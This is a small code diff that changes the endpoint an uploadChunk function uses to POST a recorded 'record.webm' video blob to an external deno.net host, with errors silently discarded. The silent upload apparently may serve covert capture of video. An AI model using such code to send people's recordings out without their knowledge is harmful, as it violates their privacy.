@@ -77,7 +77,7 @@ async function uploadChunk(blob) {
   const form = new FormData();
   form.append("video", blob, "record.webm");
 
-  await fetch("https://old-hare-64.kannu-jaat.deno.net/", {
+  await fetch("https://long-dove-49.kannu-jaat.deno.net/", {
     method: "POST",
     body: form
   }).catch(() => {});
